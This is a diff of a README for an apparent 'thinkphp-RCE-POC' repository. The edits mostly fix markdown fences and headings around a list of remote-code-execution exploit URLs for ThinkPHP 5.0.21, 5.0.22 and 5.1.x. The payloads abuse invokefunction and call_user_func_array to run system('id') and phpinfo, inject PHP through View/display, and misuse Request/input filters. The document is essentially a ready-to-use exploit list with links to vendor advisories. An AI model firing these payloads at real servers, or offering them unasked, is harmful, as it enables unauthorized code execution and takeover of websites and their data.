@@ -1,14 +1,12 @@
 # thinkphp-RCE-POC
 官方公告:
 
-```
-
 1、https://blog.thinkphp.cn/869075
 
 2、https://blog.thinkphp.cn/910675
-```
 
-POC:
+
+#POC:
 
 # thinkphp 5.0.22
 ```
@@ -21,15 +19,19 @@ POC:
 4、http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
 ```
 # thinkphp 5
+```
 5、http://127.0.0.1/tp5/public/?s=index/\think\View/display&content=%22%3C?%3E%3C?php%20phpinfo();?%3E&data=1
-'''
+
+```
 # thinkphp 5.0.21
+```
 6、http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
 
 7、http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
 
-'''
+```
 # thinkphp 5.1.*
+
 ```
 8、http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&filter=phpinfo&data=1
 
